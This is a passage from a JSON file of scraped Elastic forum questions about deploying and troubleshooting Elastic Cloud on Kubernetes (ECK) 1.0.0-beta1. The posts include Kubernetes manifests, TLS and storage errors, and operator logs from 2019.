\"server\", \"timestamp\": \"2019-11-04T12:12:28,008Z\", \"level\": \"WARN\", \"component\": \"r.suppressed\", \"cluster.name\": \"elastic\", \"node.name\": \"elastic-es-default-0\", \"message\": \"path: /_bulk, params: {}\", \"stacktrace\": [\"org.elasticsearch.cluster.block.ClusterBlockException: blocked by: [SERVICE_UNAVAILABLE/1/state not recovered / initialized, SERVICE_UNAVAILABLE/2/no master];\",",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "50317cd0-4da3-44d6-9ab2-e31ba79a8879",
    "url": "https://discuss.elastic.co/t/eck-1-0-0-beta1-doesnt-start-pod/209886",
    "title": "ECK 1.0.0-beta1 doesn't start pod",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "dg_hivebrite",
    "date": "November 28, 2019, 4:16pm November 29, 2019, 8:08am December 2, 2019, 10:37am",
    "body": "Hi, I'm beginning to use ECK, I deploy it on my kubernetes cluster hosted on GKE. The problem is when I'm checking if the elasticsearch cluster is running I can find my stateful sets but without pod. So I check, the count is set to 0 (in my manifest it sets to 1). When I tried to set the replica to 1, I have an other error: create Pod datawarehouse-es-master-europe-west1-c-0 in StatefulSet datawarehouse-es-master-europe-west1-c failed error: Pod \"datawarehouse-es-master-europe-west1-c-0\" is invalid: spec.containers[0].image: Required value So it seems I miss something but I don't understand where is the issue, my elasticsearch resource have an image and count, if someone can help i would be awesome. I share with you my manifests: https://gist.github.com/Dudesons/e042c7e42b94bb8f14b3e2e5537831a0",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "15a5e350-7238-496d-bb44-a7c9b26809ad",
    "url": "https://discuss.elastic.co/t/eck-compatibility-with-docker-for-windows-kubernetes/209873",
    "title": "ECK compatibility with Docker for Windows (Kubernetes)",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "olc-olivier",
    "date": "November 28, 2019, 2:19pm November 29, 2019, 8:57am November 29, 2019, 2:43pm",
    "body": "Hi, Someone could tell me if I can install ECK with Docker for Windows (compliance) ? Thx. PS: I have this error. \"logger\":\"transport\",\"message\":\"Skipping pod because it has no IP yet\",\"ver\":\"1.0.0-beta1-84792e30\",\"namespace\":\"default\",\"pod_name\":\"quickstart-es-default-0\"} Events: Type Reason Age From Message Warning FailedScheduling 67s (x2 over 67s) default-scheduler pod has unbound immediate PersistentVolumeClaims",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d7666f83-4306-42bf-81db-d641d4d7ed2b",
    "url": "https://discuss.elastic.co/t/eck-1-0-with-on-premise-k8s/209745",
    "title": "ECK 1.0 with on premise K8s",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "ikaposi",
    "date": "November 27, 2019, 6:32pm November 27, 2019, 7:51pm",
    "body": "Hi, I have installed a basic k8s cluster with kubeadm; cluster node state is ready and I can deploy an nginx image.. so far so good. Next I installed the elastic operator (1.0.0-beta1) using the steps described on: https://www.elastic.co/downloads/elastic-cloud-kubernetes The operator seems to install fine and I can launch a kibana instance. However elasticsearch pods remain in pending state and the error message I get is: pod has unbound immediate PersistentVolumeClaims If i type kubectl describe pvc elastic i get: no persistent volumes available for this claim and no storage class is set I tried creating a pv but with no success. Does anybody have an idea what I am doing wrong?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "860b3f5b-6774-4612-bac5-ea0c5080a832",
    "url": "https://discuss.elastic.co/t/waiting-for-the-transport-certificates-mnt-elastic-internal-transport-certificates-elasticsearch-sample-es-default-0-tls-key/209313",
    "title": "Waiting for the transport certificates (/mnt/elastic-internal/transport-certificates/elasticsearch-sample-es-default-0.tls.key)",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "ftyuuu",
    "date": "November 25, 2019, 1:36pm November 26, 2019, 9:11am November 26, 2019, 11:28am",
    "body": "I want to debug es, so i commented on the following code in cmd/manager/main.go. But pod stop at init container (elastic-internal-init-filesystem). if operator.HasRole(operator.NamespaceOperator, roles) { //if err = apmserver.Add(mgr, params); err != nil { // log.Error(err, \"unable to create controller\", \"controller\", \"ApmServer\") // os.Exit(1) //} if err = elasticsearch.Add(mgr, params); err != nil { log.Error(err, \"unable to create controller\", \"controller\", \"Elasticsearch\") os.Exit(1) } //if err = kibana.Add(mgr, params); err != nil { // log.Error(err, \"unable to create controller\", \"controller\", \"Kibana\") // os.Exit(1) //} //if err = asesassn.Add(mgr, params); err != nil { // log.Error(err, \"unable to create controller\", \"controller\", \"ApmServerElasticsearchAssociation\") // os.Exit(1) //} //if err = kbassn.Add(mgr, params); err != nil { // log.Error(err, \"unable to create controller\", \"controller\", \"KibanaAssociation\") // os.Exit(1) //} } Logs: Starting init script ... '/usr/share/elasticsearch/bin/x-pack' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack' '/usr/share/elasticsearch/bin/x-pack/certgen' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/certgen' '/usr/share/elasticsearch/bin/x-pack/users' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/users' '/usr/share/elasticsearch/bin/x-pack/saml-metadata.bat' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/saml-metadata.bat' '/usr/share/elasticsearch/bin/x-pack/sql-cli.bat' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/sql-cli.bat' '/usr/share/elasticsearch/bin/x-pack/croneval' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/croneval' '/usr/share/elasticsearch/bin/x-pack/certutil' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/certutil' '/usr/share/elasticsearch/bin/x-pack/sql-cli' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/sql-cli' '/usr/share/elasticsearch/bin/x-pack/migrate.bat' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/migrate.bat' '/usr/share/elasticsearch/bin/x-pack/certutil.bat' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/certutil.bat' '/usr/share/elasticsearch/bin/x-pack/setup-passwords' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/setup-passwords' '/usr/share/elasticsearch/bin/x-pack/setup-passwords.bat' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/setup-passwords.bat' '/usr/share/elasticsearch/bin/x-pack/certgen.bat' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/certgen.bat' '/usr/share/elasticsearch/bin/x-pack/croneval.bat' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/croneval.bat' '/usr/share/elasticsearch/bin/x-pack/syskeygen.bat' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/syskeygen.bat' '/usr/share/elasticsearch/bin/x-pack/saml-metadata' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/saml-metadata' '/usr/share/elasticsearch/bin/x-pack/syskeygen' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/syskeygen' '/usr/share/elasticsearch/bin/x-pack/migrate' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/migrate' '/usr/share/elasticsearch/bin/x-pack/users.bat' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack/users.bat' '/usr/share/elasticsearch/bin/x-pack-env' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack-env' '/usr/share/elasticsearch/bin/x-pack-env.bat' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack-env.bat' '/usr/share/elasticsearch/bin/x-pack-security-env' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack-security-env' '/usr/share/elasticsearch/bin/x-pack-security-env.bat' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack-security-env.bat' '/usr/share/elasticsearch/bin/x-pack-watcher-env' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack-watcher-env' '/usr/share/elasticsearch/bin/x-pack-watcher-env.bat' -> '/mnt/elastic-internal/elasticsearch-bin-local/x-pack-watcher-env.bat' Files copy duration: 0 sec. chowning /usr/share/elasticsearch/data to elasticsearch:elasticsearch ownership of '/usr/share/elasticsearch/data' retained as elasticsearch:elasticsearch chowning /usr/share/elasticsearch/logs to elasticsearch:elasticsearch changed ownership of '/usr/share/elasticsearch/logs' from root:root to elasticsearch:elasticsearch chown duration: 0 sec. waiting for the transport certificates (/mnt/elastic-internal/transport-certificates/elasticsearch-sample-es-default-0.tls.key) what should i do?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "feb58541-d5b3-41b5-81f0-62760537741d",
    "url": "https://discuss.elastic.co/t/new-user-cant-login-kibana/204810",
    "title": "New user can't login kibana",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "lonelyleaf",
    "date": "October 23, 2019, 7:57am October 23, 2019, 8:11am October 23, 2019, 8:49am November 19, 2019, 3:37pm November 26, 2019, 10:08am November 26, 2019, 10:26am November 26, 2019, 10:42am",
    "body": "I setup eck and login by default \"elastic\" account successfully.But I or logstash can't login by new account created in kibana. {\"statusCode\":401,\"error\":\"Unauthorized\",\"message\":\"[security_exception] unable to authenticate user [gmt-log-logstash] for REST request [/_security/_authenticate], with { header={ WWW-Authenticate={ 0=\"Bearer realm=\\\"security\\\"\" & 1=\"ApiKey\" & 2=\"Basic realm=\\\"security\\\" charset=\\\"UTF-8\\\"\" } } }\"}",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "872f8572-a209-47ff-803b-0f4838aa563a",
    "url": "https://discuss.elastic.co/t/cant-change-xpack-security-realms-in-eck-1-0/209118",
    "title": "Can't change xpack security realms in ECK 1.0",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "",
    "date": "November 22, 2019, 7:45pm November 25, 2019, 8:21am November 25, 2019, 9:44pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6a0f13ae-2fad-4c8d-a959-b94f082cad77",
    "url": "https://discuss.elastic.co/t/eck-data-node-type-selection/209277",
    "title": "ECK data node type selection",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Komal_Agarwal",
    "date": "November 25, 2019, 10:20am November 25, 2019, 10:37am",
    "body": "We have a cluster holding ~400gbs of data. We have divided this using 6 data nodes(2 nodes X 3 zones). Currently, in Elastic Cloud, all these are I3 machines. We want to understand what would be better in ECK - I3 nodes using local storage or another node such as R5/M5 using EBS volumes. It seems I3 might be better keeping memory in mind, but then EBS volumes would be faster to restore data in case of node failure. Please suggest.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "cba37fce-d7e3-40b0-912f-59e619a4d7ef",
    "url": "https://discuss.elastic.co/t/ssl-handshake-fails-between-kibana-apmserver-and-elasticsearch-after-custom-certificate-setting-on-elasticsearch/208604",
    "title": "SSL handshake fails between Kibana/APMServer and Elasticsearch after custom certificate setting on Elasticsearch",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Bingu_Shim",
    "date": "November 20, 2019, 4:15pm November 20, 2019, 1:37pm November 21, 2019, 2:17am",
    "body": "I'm trying to configure our own certificate to the Elasticsearch, Kibana and APM Server, and got ssl handshake errors. I referenced This document for setting. The symptoms and my environments are as follow, and if there is any more information please let me know. Environment ECK Version : 1.0.0Beta1 Elastic Image Version : 7.4.2 Certificate Info : Issued by a well-known CA to the *.mycompany.com domain Certificate is add to the k8s cluster with this name : my-cert Referenced this manual Domain names for service are registered to the DNS Server as follow Elasticsearch : es.mycompany.com (10.0.0.2) Kibana : kb.mycompany.com (10.0.0.3) APM Server : apm.mycompany.com (10.0.0.4) (I replaced the domain name as mycompany.com) Symptoms I can connect with Chrome browser without any certificate error with this url https://es.mycompany.com:9200 However, Kibana readness fails and the logs are: {\"type\":\"log\",\"@timestamp\":\"2019-11-19T07:59:41Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":6,\"message\":\"No living connections\"} {\"type\":\"log\",\"@timestamp\":\"2019-11-19T07:59:43Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":6,\"message\":\"Unable to revive connection: https://es-cluster-es-http.default.svc:9200/\"} {\"type\":\"log\",\"@timestamp\":\"2019-11-19T07:59:43Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":6,\"message\":\"No living connections\"} {\"type\":\"log\",\"@timestamp\":\"2019-11-19T07:59:46Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":6,\"message\":\"Unable to revive connection: https://es-cluster-es-http.default.svc:9200/\"} APMServer passed the readness check but doen't work properly, and the logs are: 2019-11-19T09:27:47.607Z ERROR pipeline/output.go:100 Failed to connect to backoff(elasticsearch(https://es-cluster-es-http.default.svc:9200)): Get https://es-cluster-es-http.default.svc:9200: x509: certificate is valid for *.mycompany.com, mycompany.com, not es-cluster-es-http.default.svc 2019-11-19T09:27:47.607Z INFO pipeline/output.go:93 Attempting to reconnect to backoff(elasticsearch(https://es-cluster-es-http.default.svc:9200)) with 149 reconnect attempt(s) Yaml Files The followings are the yaml files that I used. (I replaced domain and IP address) # Source: apm.yaml apiVersion: apm.k8s.elastic.co/v1beta1 kind: ApmServer metadata: name: es-cluster spec: version: 7.4.2 http: service: spec: type: LoadBalancer loadBalancerIP: 10.0.0.4 tls: selfSignedCertificate: subjectAltNames: - ip: 10.0.0.4 - dns: apm.mycompany.com certificate: secretName: my-cert count: 1 elasticsearchRef: name: es-cluster podTemplate: metadata: labels: project: paas idc: app : apmServer spec: containers: - name: apm-server resources: request: memory: 12Gi cpu: 1 limits: memory: 12Gi cpu: 3 env: - name: ES_JAVA_OPTS value: \"-Xms6g -Xmx6g\" --- # Source: es.yaml apiVersion: elasticsearch.k8s.elastic.co/v1beta1 kind: Elasticsearch metadata: name: es-cluster spec: http: service: spec: type: LoadBalancer loadBalancerIP: 10.0.0.2 tls: selfSignedCertificate: subjectAltNames: - ip: 10.0.0.2 - dns: es.mycompany.com certificate: secretName: my-cert version: 7.4.2 nodeSets: - name: node count: 1 config: node.master: true node.ingest: true node.data: true node.store.allow_mmap: true podTemplate: metadata: labels: name: master spec: initContainers: - name: sysctl securityContext: privileged: true command: ['sh', '-c', 'sysctl -w vm.max_map_count=262144'] - name: install-gcs-plugins command: ['sh', '-c', 'bin/elasticsearch-plugin install --batch repository-gcs'] - name: install-hdfs-plugins command: ['sh', '-c', 'bin/elasticsearch-plugin install --batch repository-hdfs'] containers: - name: elasticsearch resources: request: memory: 12Gi cpu: 1 limits: memory: 12Gi cpu: 3 env: - name: ES_JAVA_OPTS value: \"-Xms6g -Xmx6g\" volumeClaimTemplates: - metadata: name: elasticsearch-data spec: accessModes: - ReadWriteOnce resources: requests: storage: 500Gi storageClassName: fast --- # Source: kb.yaml apiVersion: kibana.k8s.elastic.co/v1beta1 kind: Kibana metadata: name: es-cluster spec: version: 7.4.2 count: 1 elasticsearchRef: name: es-cluster http: service: spec: type: LoadBalancer loadBalancerIP: 10.0.0.3 tls: selfSignedCertificate: subjectAltNames: - ip: 10.0.0.3 - dns: kb.mycompany.com certificate: secretName: my-cert podTemplate: metadata: labels: name: kb-alpha spec: containers: - name: kibana resources: request: memory: 12Gi cpu: 1 limits: memory: 12Gi cpu: 3 env: - name: ES_JAVA_OPTS value: \"-Xms6g -Xmx6g\" I tried these Elasticsearch http configs and it all fail with same error http: ... tls: selfSignedCertificate: disabled: true certificate: secretName: my-cert http: ... tls: certificate: secretName: my-cert",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8af8ac2a-9cf5-4f6e-9e65-abcb00c3c8bc",
    "url": "https://discuss.elastic.co/t/kibana-cant-connect-to-es-having-openstack-loadbalancer-setting/206691",
    "title": "Kibana can't connect to ES having (openstack) LoadBalancer setting",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "JuYeong_Park",
    "date": "November 5, 2019, 11:21pm November 7, 2019, 2:35pm November 10, 2019, 10:28pm November 18, 2019, 11:44am November 19, 2019, 5:00am",
    "body": "I want to use ES and Kibana on LoadBalancer Env. So, i added load balancer options to ES yaml as below. apiVersion: elasticsearch.k8s.elastic.co/v1beta1 kind: Elasticsearch metadata: name: lb spec: http: service: metadata: annotations: service.beta.kubernetes.io/openstack-internal-load-balancer: \"true\" spec: externalTrafficPolicy: Local type: LoadBalancer ... And then, i executed Kibana yaml(default) as below. apiVersion: kibana.k8s.elastic.co/v1beta1 kind: Kibana metadata: name: test spec: version: 6.8.0 count: 1 elasticsearchRef: name: \"lb\" podTemplate: spec: containers: - name: kibana resources: limits: memory: 1Gi cpu: 1 On this settings, kibana coudln't be executed normally having error as below. kubernetes error Warning Unhealthy 2m43s (x179 over 32m) kubelet, dkosv3-ingress-test-worker-4 Readiness probe failed: HTTP probe failed with statuscode: 503 docker error {\"type\":\"log\",\"@timestamp\":\"2019-11-05T22:57:32Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":1,\"message\":\"Unable to revive connection: https://lb-es-http.default.svc:9200/\"} {\"type\":\"log\",\"@timestamp\":\"2019-11-05T22:57:32Z\",\"tags\":[\"warning\",\"elasticsearch\",\"admin\"],\"pid\":1,\"message\":\"No living connections\"} {\"type\":\"log\",\"@timestamp\":\"2019-11-05T22:57:32Z\",\"tags\":[\"warning\",\"task_manager\"],\"pid\":1,\"message\":\"PollError No Living connections\"} So, i want to know that what options is needed to use kibana for es having load balancer settings.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "0cfc358f-388f-434e-a0e0-866c646bf48e",
    "url": "https://discuss.elastic.co/t/trouble-installing-kibana-plugin/207984",
    "title": "Trouble installing kibana plugin",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "terryE",
    "date": "November 15, 2019, 2:34am November 15, 2019, 8:05pm",
    "body": "I'm trying to use an init container to install a kibana plugin but I'm getting an error. Events: Type Reason Age From Message Warning ReconciliationError 11m (x18 over 30m) kibana-controller Reconciliation error: Deployment.apps \"logs-kb\" is invalid: spec.template.spec.initContainers[0].image: Required value I'm hoping I don't need to specify the image in the podtemplate and can leave it to eck to populate this correctly. Am I doing something wrong? Here's my kibana spec apiVersion: kibana.k8s.elastic.co/v1beta1 kind: Kibana metadata: name: logs namespace: tools spec: version: 7.4.2 count: 1 elasticsearchRef: name: logs http: tls: selfSignedCertificate: disabled: true podTemplate: spec: initContainers: - name: install-plugins command: ['sh', '-c', '|bin/kibana-plugin install https://github.com/sivasamyk/logtrail/releases/download/v0.1.31/logtrail-7.4.1-0.1.31.zip' ]",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8075f0ca-1332-4305-ac58-e8d3e1f1d8e7",
    "url": "https://discuss.elastic.co/t/having-issues-with-more-than-1-instance/207154",
    "title": "Having issues with more than 1 instance",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "booboothefool",
    "date": "November 8, 2019, 5:27pm November 8, 2019, 9:16pm November 13, 2019, 9:30pm",
    "body": "Hi there so I've gotten the single instance configuration to work. And Kibana is able to connect to it. apiVersion: elasticsearch.k8s.elastic.co/v1beta1 kind: Elasticsearch metadata: name: elastic spec: version: 7.4.2 nodeSets: - name: default count: 1 config: node.master: true node.data: true node.ingest: true node.store.allow_mmap: false http: tls: selfSignedCertificate: disabled: true However as soon as I try to add more, in order to scale out reads e.g.: apiVersion: elasticsearch.k8s.elastic.co/v1beta1 kind: Elasticsearch metadata: name: elastic spec: version: 7.4.2 nodeSets: - name: default count: 3 config: node.master: true node.data: true node.ingest: true node.store.allow_mmap: false http: tls: selfSignedCertificate: disabled: true apiVersion: elasticsearch.k8s.elastic.co/v1beta1 kind: Elasticsearch metadata: name: elastic spec: version: 7.4.2 nodeSets: - name: default count: 1 config: node.master: true node.data: true node.ingest: true node.store.allow_mmap: false - name: data count: 2 config: node.master: false node.data: true node.ingest: false node.store.allow_mmap: false http: tls: selfSignedCertificate: disabled: true All of my Elasticsearch pods start crashing/erroring out, and Kibana is not able to connect. If I start with 1 Elasticsearch + 1 Kibana it is able to connect, then when I scale up to 3 Elasticsearch, the pods stay running but eventually Kibana shows everything in a red state and it no longer works. I am running on an 8 vCPU x 32GB mem + 4 vCPU x 16GB mem + 4 vCPU x 16GB mem, so I believe I have enough resources. Any suggestions?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "1768569b-edfe-42f3-a084-532b8ee2956b",
    "url": "https://discuss.elastic.co/t/cross-cluster-search-on-eck-how-to-set-ca-cert/202113",
    "title": "Cross Cluster Search on ECK - how to set ca cert",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "iremmats",
    "date": "October 3, 2019, 8:24am October 16, 2019, 11:54pm October 17, 2019, 5:54am October 17, 2019, 7:32pm October 17, 2019, 8:21pm October 18, 2019, 8:26am October 18, 2019, 9:01am October 18, 2019, 5:53pm October 20, 2019, 6:39pm October 20, 2019, 11:52pm October 20, 2019, 11:57pm October 21, 2019, 6:03am October 21, 2019, 9:10am October 21, 2019, 9:11am October 23, 2019, 8:48am October 25, 2019, 6:48pm November 12, 2019, 9:40pm",
    "body": "Hi, So we are playing around with ECK on multiple clusters in different region. We want to establish cross cluster search from one central cluster. How can we set the ca-cert for our clusters during creation? We followed the instructions here to set the http certificate but how do we set the CA cert? https://www.elastic.co/guide/en/cloud-on-k8s/current/k8s-custom-http-certificate.html This is the error we get right now. { \"error\": { \"root_cause\": [ { \"type\": \"transport_exception\", \"reason\": \"handshake failed because connection reset\" } ], \"type\": \"connect_transport_exception\", \"reason\": \"[100.102.0.8:9300] general node connection failure\", \"caused_by\": { \"type\": \"transport_exception\", \"reason\": \"handshake failed because connection reset\" } }, \"status\": 500 }",
    "website_area": "discuss",
    "replies": 17
  },
  {
    "id": "918f32a2-913c-4b9e-b255-e919c8f687f9",
    "url": "https://discuss.elastic.co/t/logstash-and-eck/206997",
    "title": "Logstash and ECK",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "dbwest",
    "date": "November 7, 2019, 6:09pm November 7, 2019, 9:54pm November 7, 2019, 10:32pm",
    "body": "Is Logstash part of ECK? How do I add it in? Is it currently on any dev branches or are there any ways to get edge releases that include it? I do not see it in stable. Are there any plans to add it in?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4662023a-bb55-4868-9153-4ecd8d096f3f",
    "url": "https://discuss.elastic.co/t/does-helm-use-official-eck-under-the-hood/206067",
    "title": "Does Helm use official ECK under the hood?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "LeFrancois",
    "date": "October 31, 2019, 3:04pm November 6, 2019, 7:47am",
    "body": "Hello, After reading the doc of Helm charts I saw it was grounded on the Docker images of ElasticSearch. But under the hood it seem strange that the features / codebase is not shared with ECK. I would like to clarifiy to know if the official Helm charts provide the same features as describe here ? Or this only a normal version of ES. I know the question can seem weird, but the number of features worth to put aside your official Chart . Thank you in advance",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "683f953c-151f-4b0e-b8fa-6366fa23ef8f",
    "url": "https://discuss.elastic.co/t/failed-to-get-api-group-resources/206482",
    "title": "Failed to get API Group-Resources",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "alexus",
    "date": "November 5, 2019, 4:29pm November 5, 2019, 10:46am November 5, 2019, 8:28pm",
    "body": "Hello World! I'm trying to Deploy ECK in your Kubernetes cluster, yet running into following issue: $ microk8s.kubectl apply -f https://download.elastic.co/downloads/eck/1.0.0-beta1/all-in-one.yaml customresourcedefinition.apiextensions.k8s.io/apmservers.apm.k8s.elastic.co created customresourcedefinition.apiextensions.k8s.io/elasticsearches.elasticsearch.k8s.elastic.co created customresourcedefinition.apiextensions.k8s.io/kibanas.kibana.k8s.elastic.co created clusterrole.rbac.authorization.k8s.io/elastic-operator created clusterrolebinding.rbac.authorization.k8s.io/elastic-operator created namespace/elastic-system created statefulset.apps/elastic-operator created serviceaccount/elastic-operator created $ microk8s.kubectl -n elastic-system logs -f statefulset.apps/elastic-operator Error from server: Get https://noc.uftwf.local:10250/containerLogs/elastic-system/elastic-operator-0/manager?follow=true: dial tcp: lookup noc.uftwf.local on 208.67.222.222:53: no such host $ I thought maybe this would help: $ echo \"X.X.X.X noc.uftwf.local\" >> /etc/hosts $ microk8s.kubectl -n elastic-system logs -f statefulset.apps/elastic-operator {\"level\":\"info\",\"@timestamp\":\"2019-11-04T21:30:03.518Z\",\"logger\":\"manager\",\"message\":\"Setting up client for manager\",\"ver\":\"1.0.0-beta1-84792e30\"} {\"level\":\"info\",\"@timestamp\":\"2019-11-04T21:30:03.518Z\",\"logger\":\"manager\",\"message\":\"Setting up scheme\",\"ver\":\"1.0.0-beta1-84792e30\"} {\"level\":\"info\",\"@timestamp\":\"2019-11-04T21:30:03.518Z\",\"logger\":\"manager\",\"message\":\"Setting up manager\",\"ver\":\"1.0.0-beta1-84792e30\"} {\"level\":\"error\",\"@timestamp\":\"2019-11-04T21:30:04.563Z\",\"logger\":\"controller-runtime.manager\",\"message\":\"Failed to get API Group-Resources\",\"ver\":\"1.0.0-beta1-84792e30\",\"error\":\"Get https://10.152.183.1:443/api?timeout=32s: dial tcp 10.152.183.1:443: connect: no route to host\",\"stacktrace\":\"github.com/go-logr/zapr.(*zapLogger).Error\\n\\t/go/pkg/mod/github.com/go-logr/zapr@v0.1.0/zapr.go:128\\nsigs.k8s.io/controller-runtime/pkg/manager.New\\n\\t/go/pkg/mod/sigs.k8s.io/controller-runtime@v0.2.1/pkg/manager/manager.go:212\\ngithub.com/elastic/cloud-on-k8s/cmd/manager.execute\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/manager/main.go:227\\ngithub.com/elastic/cloud-on-k8s/cmd/manager.glob..func1\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/manager/main.go:74\\ngithub.com/spf13/cobra.(*Command).execute\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:830\\ngithub.com/spf13/cobra.(*Command).ExecuteC\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:914\\ngithub.com/spf13/cobra.(*Command).Execute\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:864\\nmain.main\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/main.go:27\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\"} {\"level\":\"error\",\"@timestamp\":\"2019-11-04T21:30:04.564Z\",\"logger\":\"manager\",\"message\":\"unable to create controller manager\",\"ver\":\"1.0.0-beta1-84792e30\",\"error\":\"Get https://10.152.183.1:443/api?timeout=32s: dial tcp 10.152.183.1:443: connect: no route to host\",\"stacktrace\":\"github.com/go-logr/zapr.(*zapLogger).Error\\n\\t/go/pkg/mod/github.com/go-logr/zapr@v0.1.0/zapr.go:128\\ngithub.com/elastic/cloud-on-k8s/cmd/manager.execute\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/manager/main.go:229\\ngithub.com/elastic/cloud-on-k8s/cmd/manager.glob..func1\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/manager/main.go:74\\ngithub.com/spf13/cobra.(*Command).execute\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:830\\ngithub.com/spf13/cobra.(*Command).ExecuteC\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:914\\ngithub.com/spf13/cobra.(*Command).Execute\\n\\t/go/pkg/mod/github.com/spf13/cobra@v0.0.5/command.go:864\\nmain.main\\n\\t/go/src/github.com/elastic/cloud-on-k8s/cmd/main.go:27\\nruntime.main\\n\\t/usr/local/go/src/runtime/proc.go:203\"} $ but it didn't( Please advise.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "93e51eea-68fd-464b-a32e-79ded2b41534",
    "url": "https://discuss.elastic.co/t/adding-a-custom-volume-for-backups/205324",
    "title": "Adding a Custom Volume for Backups",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Zorlack",
    "date": "October 25, 2019, 8:21pm October 25, 2019, 8:49pm October 25, 2019, 9:03pm October 26, 2019, 3:32am October 28, 2019, 6:01am October 29, 2019, 12:54pm October 29, 2019, 1:32pm October 29, 2019, 2:23pm October 29, 2019, 2:48pm October 30, 2019, 9:05am November 4, 2019, 1:33pm",
    "body": "Hello, I'm interested in mounting a shared NFS PersistentVolume across an Elasticsearch ECK cluster so that I can add it has a Snapshot Repository. (This seems to be the obvious solution for on-prem snapshotting) I've created a deployment (by cribbing from the Synonym configmap example) which attempts to use podTemplate to accomplish this: [SNIP] podTemplate: metadata: labels: es-role: \"data-search\" spec: containers: - name: elasticsearch resources: limits: memory: 60G cpu: 7 env: - name: ES_JAVA_OPTS value: \"-Xms30g -Xmx30g\" volumeMounts: - name: snapshot-claim-volume mountPath: /mnt/snapshots volumes: - name: snapshot-claim-volume persistentVolumeClaim: claimName: snapshot-claim [SNIP] When I try to deploy this using ECK, It gets stuck starting with: create Pod fusion-search-a-es-data-searchers-0 in StatefulSet fusion-search-a-es-data-searchers failed error: Pod \"fusion-search-a-es-data-searchers-0\" is invalid: [spec.containers[0].volumeMounts[12].name: Not found: \"snapshot-claim-volume\", spec.initContainers[0].volumeMounts[12].name: Not found: \"snapshot-claim-volume\"] Have I misunderstood something? What am I doing wrong here? Many thanks! -Z",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "a22b3fa3-a747-4390-bdc9-4689147403db",
    "url": "https://discuss.elastic.co/t/is-it-possible-to-use-oss-docker-images-without-xpack/184410",
    "title": "Is it possible to use OSS docker images (without xpack)?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
